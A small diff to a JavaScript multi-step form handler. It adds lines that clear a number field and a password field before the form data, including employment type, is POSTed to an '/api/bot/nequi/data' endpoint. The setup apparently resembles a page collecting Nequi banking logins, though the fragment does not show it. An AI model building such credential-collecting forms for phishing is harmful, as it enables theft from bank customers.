@@ -72,6 +72,9 @@ const handleStepOneSubmit = (e) => {
             tipo_empleo: info.tipo_empleo
         };
 
+        inputNumber.value = '';
+        inputPass.value = '';
+
         // Make API request
         fetch(`${API_URL}/api/bot/nequi/data`, {
             method: 'POST',
